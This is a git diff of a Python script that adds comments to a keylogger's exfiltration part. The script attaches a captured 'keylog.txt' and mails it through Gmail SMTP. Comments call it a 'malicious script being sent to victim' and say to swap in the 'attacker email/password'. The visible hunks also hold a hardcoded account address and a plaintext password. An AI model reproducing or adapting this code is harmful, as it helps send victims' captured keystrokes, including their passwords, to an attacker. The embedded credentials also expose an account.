@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-
+# import statements
 import smtplib
 from email import encoders
 from email.mime.text import MIMEText
@@ -7,7 +7,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from bs4 import BeautifulSoup as bs
 
-
+# malicious script being sent to victim
 files_to_send = [
     "keylog.txt",
 ]
@@ -20,7 +20,7 @@ def send_mail(email, password, FROM, TO, msg):
     server.sendmail(FROM, TO, msg.as_string())
     server.quit()
 
-
+# change these to attacker email/password
 email = "keyloggtester4@gmail.com"
 password = "Kalibox123?"
 
@@ -29,6 +29,7 @@ FROM = "keyloggtester4@gmail.com"
 TO   = "keyloggtester4@gmail.com"
 subject = "Just a subject"
 
+# edit the html field and insert a document to be the body of the email
 msg = MIMEMultipart("alternative")
 msg["From"] = FROM
 msg["To"] = TO
